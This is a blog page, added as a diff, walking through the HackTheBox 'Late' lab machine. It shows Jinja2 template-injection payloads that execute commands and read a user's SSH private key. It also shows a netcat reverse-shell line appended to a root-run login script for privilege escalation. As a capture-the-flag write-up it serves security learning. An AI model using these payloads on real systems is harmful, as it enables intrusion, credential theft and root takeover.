@@ -1,0 +1,407 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Hackthebox - Late - Saad Akhtar</title><meta name="Description" content="Hackthebox easy machine late walkthrough &amp; tutorial.."><meta property="og:title" content="Hackthebox - Late" />
+<meta property="og:description" content="Hackthebox easy machine late walkthrough &amp; tutorial.." />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/hackthebox-late/" /><meta property="og:image" content="/hackthebox-late/0.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2022-08-01T08:26:21+05:00" />
+<meta property="article:modified_time" content="2022-08-01T08:26:21+05:00" /><meta property="og:site_name" content="Saad Akhtar" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/hackthebox-late/0.png"/>
+<meta name="twitter:title" content="Hackthebox - Late"/>
+<meta name="twitter:description" content="Hackthebox easy machine late walkthrough &amp; tutorial.."/>
+<meta name="application-name" content="Saad Akhtar">
+<meta name="apple-mobile-web-app-title" content="Saad Akhtar"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="icon" href="favicon.svg"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/hackthebox-late/" /><link rel="prev" href="/pwnable.kr-toddlers-bottle-bof/" /><link rel="next" href="/pwnable.kr-toddlers-bottle-coin1/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.1.1/css/all.min.css"></noscript><link rel="preload" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Hackthebox - Late",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/hackthebox-late\/"
+        },"image": [{
+                            "@type": "ImageObject",
+                            "url": "\/hackthebox-late\/0.png",
+                            "width":  800 ,
+                            "height":  605 
+                        }],"genre": "posts","keywords": "hackthebox, machines","wordcount":  391 ,
+        "url": "\/hackthebox-late\/","datePublished": "2022-08-01T08:26:21+05:00","dateModified": "2022-08-01T08:26:21+05:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Saad Akhtar"
+            },"description": "Hackthebox easy machine late walkthrough \u0026 tutorial.."
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> Posts </a><a class="menu-item" href="/tags/"> Tags </a><a class="menu-item" href="/categories/"> Categories </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Saad Akhtar"><span class="header-title-pre">> root@</span>ssaadakhtarr<span class="header-title-post">#</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">Posts</a><a class="menu-item" href="/tags/" title="">Tags</a><a class="menu-item" href="/categories/" title="">Categories</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content always-active" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Hackthebox - Late</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="https://ssaadakhtarr.github.io/" title="Author" target="_blank" rel="noopener noreffer author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>Saad Akhtar</a></span>&nbsp;<span class="post-category">included in <a href="/categories/hackthebox/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>HackTheBox</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2022-08-01">2022-08-01</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;391 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;2 minutes&nbsp;</div>
+        </div><div class="featured-image"><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="/hackthebox-late/0.png"
+        data-srcset="/hackthebox-late/0.png, /hackthebox-late/0.png 1.5x, /hackthebox-late/0.png 2x"
+        data-sizes="auto"
+        alt="/hackthebox-late/0.png"
+        title="Hackthebox easy machine late walkthrough &amp; tutorial.." /></div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#enumeration">Enumeration</a></li>
+    <li><a href="#gaining-access">Gaining Access</a></li>
+    <li><a href="#usertxt">user.txt</a></li>
+    <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+    <li><a href="#roottxt">root.txt</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><p>This post is focused on the walkthrough of Easy Machine Late from HackTheBox.</p>
+<h2 id="enumeration">Enumeration</h2>
+<p>Starting out with the initial nmap scan.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -A -vv 10.10.11.156 -oN nmapN
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-late/1.png" title="Nmap Scan" data-thumbnail="/hackthebox-late/1.png" data-sub-html="<h2>Nmap Scan</h2><p>Nmap Scan</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/1.png"
+            data-srcset="/hackthebox-late/1.png, /hackthebox-late/1.png 1.5x, /hackthebox-late/1.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/1.png" width="800" height="312" />
+    </a><figcaption class="image-caption">Nmap Scan</figcaption>
+    </figure></p>
+<p>We have ports 22 and 80 is open. So let&rsquo;s enumerate port 80 now.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/2.png" title="Website" data-thumbnail="/hackthebox-late/2.png" data-sub-html="<h2>Website</h2><p>Website</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/2.png"
+            data-srcset="/hackthebox-late/2.png, /hackthebox-late/2.png 1.5x, /hackthebox-late/2.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/2.png" width="800" height="303" />
+    </a><figcaption class="image-caption">Website</figcaption>
+    </figure></p>
+<p>We have a website here titled Late.</p>
+<p>Scrolling through the website I found a link pointing to <em>images.late.htb</em>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/3.png" title="images.late.htb link" data-thumbnail="/hackthebox-late/3.png" data-sub-html="<h2>images.late.htb link</h2><p>images.late.htb link</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/3.png"
+            data-srcset="/hackthebox-late/3.png, /hackthebox-late/3.png 1.5x, /hackthebox-late/3.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/3.png" width="800" height="316" />
+    </a><figcaption class="image-caption">images.late.htb link</figcaption>
+    </figure></p>
+<p>Let&rsquo;s add late.htb and images.late.htb in our /etc/hosts file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.156 late.htb &#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;10.10.11.156 images.late.htb &#34;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Visiting <em>images.late.htb</em> we have,</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/4.png" title="images.late.htb page" data-thumbnail="/hackthebox-late/4.png" data-sub-html="<h2>images.late.htb page</h2><p>images.late.htb page</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/4.png"
+            data-srcset="/hackthebox-late/4.png, /hackthebox-late/4.png 1.5x, /hackthebox-late/4.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/4.png" width="800" height="329" />
+    </a><figcaption class="image-caption">images.late.htb page</figcaption>
+    </figure></p>
+<p>The title says it converts image to text. Let&rsquo;s try that out. </p>
+<p>I took a screenshot of a text and uploaded the file and it returned with the correct text. I uploaded,</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/5.png" title="Test Screenshot" data-thumbnail="/hackthebox-late/5.png" data-sub-html="<h2>Test Screenshot</h2><p>Test Screenshot</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/5.png"
+            data-srcset="/hackthebox-late/5.png, /hackthebox-late/5.png 1.5x, /hackthebox-late/5.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/5.png" width="229" height="41" />
+    </a><figcaption class="image-caption">Test Screenshot</figcaption>
+    </figure></p>
+<p>It returned,</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/6.png" title="Test Output" data-thumbnail="/hackthebox-late/6.png" data-sub-html="<h2>Test Output</h2><p>Test Output</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/6.png"
+            data-srcset="/hackthebox-late/6.png, /hackthebox-late/6.png 1.5x, /hackthebox-late/6.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/6.png" width="291" height="63" />
+    </a><figcaption class="image-caption">Test Output</figcaption>
+    </figure></p>
+<p>Since the title of the page says it converts image to text with flask. I started trying most common vulnerability of flask Server Side Template Injection (SSTI).</p>
+<p>I uploaded the following payload.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/7.png" title="Test Payload" data-thumbnail="/hackthebox-late/7.png" data-sub-html="<h2>Test Payload</h2><p>Test Payload</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/7.png"
+            data-srcset="/hackthebox-late/7.png, /hackthebox-late/7.png 1.5x, /hackthebox-late/7.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/7.png" width="160" height="48" />
+    </a><figcaption class="image-caption">Test Payload</figcaption>
+    </figure></p>
+<p>And it returned <em>49</em>.</p>
+<p>This confirmed the SSTI. I further enumerated to confirm the template engine and it turned out to be Jinja2.</p>
+<h2 id="gaining-access">Gaining Access</h2>
+<p>For command injection, I injected the following payload from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection" target="_blank" rel="noopener noreffer ">PayloadAllTheThings</a>.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;id&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>And got the following output.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/8.png" title="Test Output" data-thumbnail="/hackthebox-late/8.png" data-sub-html="<h2>Test Output</h2><p>Test Output</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/8.png"
+            data-srcset="/hackthebox-late/8.png, /hackthebox-late/8.png 1.5x, /hackthebox-late/8.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/8.png" width="498" height="55" />
+    </a><figcaption class="image-caption">Test Output</figcaption>
+    </figure></p>
+<p>Boom! Our command successfully got injected. Let&rsquo;s grab the ssh private key for a stable command shell.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="p">{{</span> <span class="bp">self</span><span class="o">.</span><span class="n">_TemplateReference__context</span><span class="o">.</span><span class="n">cycler</span><span class="o">.</span><span class="fm">__init__</span><span class="o">.</span><span class="vm">__globals__</span><span class="o">.</span><span class="n">os</span><span class="o">.</span><span class="n">popen</span><span class="p">(</span><span class="s1">&#39;cat /home/svc_acc/.ssh/id_rsa&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span> <span class="p">}}</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The output,</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/9.png" title="RSA Private Key" data-thumbnail="/hackthebox-late/9.png" data-sub-html="<h2>RSA Private Key</h2><p>RSA Private Key</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/9.png"
+            data-srcset="/hackthebox-late/9.png, /hackthebox-late/9.png 1.5x, /hackthebox-late/9.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/9.png" width="596" height="483" />
+    </a><figcaption class="image-caption">RSA Private Key</figcaption>
+    </figure></p>
+<h2 id="usertxt">user.txt</h2>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa svc_acc@late.htb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p><figure><a class="lightgallery" href="/hackthebox-late/10.png" title="user.txt" data-thumbnail="/hackthebox-late/10.png" data-sub-html="<h2>user.txt</h2><p>user.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/10.png"
+            data-srcset="/hackthebox-late/10.png, /hackthebox-late/10.png 1.5x, /hackthebox-late/10.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/10.png" width="800" height="427" />
+    </a><figcaption class="image-caption">user.txt</figcaption>
+    </figure></p>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>After enumerating for a while I came across a file in <em>/usr/local/sbin</em>.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/11.png" title="/usr/local/sbin" data-thumbnail="/hackthebox-late/11.png" data-sub-html="<h2>/usr/local/sbin</h2><p>/usr/local/sbin</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/11.png"
+            data-srcset="/hackthebox-late/11.png, /hackthebox-late/11.png 1.5x, /hackthebox-late/11.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/11.png" width="784" height="121" />
+    </a><figcaption class="image-caption">/usr/local/sbin</figcaption>
+    </figure></p>
+<p>Reading the file&rsquo;s contents.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/12.png" title="ssh-alert.sh" data-thumbnail="/hackthebox-late/12.png" data-sub-html="<h2>ssh-alert.sh</h2><p>ssh-alert.sh</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/12.png"
+            data-srcset="/hackthebox-late/12.png, /hackthebox-late/12.png 1.5x, /hackthebox-late/12.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/12.png" width="800" height="417" />
+    </a><figcaption class="image-caption">ssh-alert.sh</figcaption>
+    </figure></p>
+<p>As can be seen this file is sending a mail to <em><a href="mailto:root@late.htb" rel="">root@late.htb</a></em> every time a ssh login is detected.</p>
+<p>I tried manipulating the file&rsquo;s contents but got a message Operation not permitted.</p>
+<p>Checking the file&rsquo;s attributes.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/13.png" title="lsattr" data-thumbnail="/hackthebox-late/13.png" data-sub-html="<h2>lsattr</h2><p>lsattr</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/13.png"
+            data-srcset="/hackthebox-late/13.png, /hackthebox-late/13.png 1.5x, /hackthebox-late/13.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/13.png" width="636" height="49" />
+    </a><figcaption class="image-caption">lsattr</figcaption>
+    </figure></p>
+<p>Since &lsquo;a&rsquo; (append only) flag is enabled, we can append our code within the script to escalate our privileges.</p>
+<p>I appended a reverse shell in the script which will connect back to my machine as root.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.8 4444 &gt;/tmp/f&#34;</span> &gt;&gt; ssh-alert.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>On my machine I started up a netcat listener</p>
+<p>Now I need to login using ssh again and I&rsquo;ll get a connection back to my machine.</p>
+<p><figure><a class="lightgallery" href="/hackthebox-late/14.png" title="nc listener" data-thumbnail="/hackthebox-late/14.png" data-sub-html="<h2>nc listener</h2><p>nc listener</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/14.png"
+            data-srcset="/hackthebox-late/14.png, /hackthebox-late/14.png 1.5x, /hackthebox-late/14.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/14.png" width="773" height="170" />
+    </a><figcaption class="image-caption">nc listener</figcaption>
+    </figure></p>
+<h2 id="roottxt">root.txt</h2>
+<p><figure><a class="lightgallery" href="/hackthebox-late/15.png" title="root.txt" data-thumbnail="/hackthebox-late/15.png" data-sub-html="<h2>root.txt</h2><p>root.txt</p>">
+        <img
+            class="lazyload"
+            src="/svg/loading.min.svg"
+            data-src="/hackthebox-late/15.png"
+            data-srcset="/hackthebox-late/15.png, /hackthebox-late/15.png 1.5x, /hackthebox-late/15.png 2x"
+            data-sizes="auto"
+            alt="/hackthebox-late/15.png" width="800" height="387" />
+    </a><figcaption class="image-caption">root.txt</figcaption>
+    </figure></p>
+<center>
+<img src="16.gif" alt="yess" width="400"/>
+</center>
+<p><strong>Thanks for reading!</strong></p></div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>Updated on 2022-08-01</span>
+            </div></div>
+        <div class="post-info-line">
+            <div class="post-info-md"><span>
+                            <a class="link-to-markdown" href="/hackthebox-late/index.md" target="_blank">Read Markdown</a>
+                        </span></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="Share on Twitter" data-sharer="twitter" data-url="/hackthebox-late/" data-title="Hackthebox - Late" data-via="ssaadakhtarr" data-hashtags="hackthebox,machines"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Facebook" data-sharer="facebook" data-url="/hackthebox-late/" data-hashtag="hackthebox"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Share on Linkedin" data-sharer="linkedin" data-url="/hackthebox-late/"><i class="fab fa-linkedin fa-fw" aria-hidden="true"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href="/tags/hackthebox/">hackthebox</a>,&nbsp;<a href="/tags/machines/">machines</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">Back</a></span>&nbsp;|&nbsp;<span><a href="/">Home</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/pwnable.kr-toddlers-bottle-bof/" class="prev" rel="prev" title="Pwnable.kr - Toddler&#39;s Battle - [bof]"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pwnable.kr - Toddler's Battle - [bof]</a>
+            <a href="/pwnable.kr-toddlers-bottle-coin1/" class="next" rel="next" title="Pwnable.kr - Toddler&#39;s Battle - [coin1]">Pwnable.kr - Toddler's Battle - [coin1]<i class="fas fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line">Powered by <a href="https://gohugo.io/" target="_blank" rel="noopener noreffer" title="Hugo 0.105.0">Hugo</a> | Theme - <a href="https://github.com/dillonzq/LoveIt" target="_blank" rel="noopener noreffer" title="LoveIt 0.2.11"><i class="far fa-kiss-wink-heart fa-fw" aria-hidden="true"></i> LoveIt</a>
+                </div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"><i class="far fa-copyright fa-fw" aria-hidden="true"></i><span itemprop="copyrightYear">2022 - 2023</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Saad Akhtar</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Back to Top">
+                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="View Comments">
+                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
+            </a>
+        </div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/css/lightgallery-bundle.min.css"><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/autocomplete.js@0.38.1/dist/autocomplete.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/algoliasearch@4.13.1/dist/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lazysizes@5.3.2/lazysizes.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/lightgallery.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/thumbnail/lg-thumbnail.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/lightgallery@2.5.0/plugins/zoom/lg-zoom.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/clipboard@2.0.11/dist/clipboard.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/sharer.js@0.5.1/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copy to clipboard","maxShownLines":50},"comment":{},"lightgallery":true,"search":{"algoliaAppID":"PASDMWALPK","algoliaIndex":"index.en","algoliaSearchKey":"b42948e51daaa93df92381c8e2ac0f93","highlightTag":"em","maxResultLength":10,"noResultsFound":"No results found","snippetLength":30,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
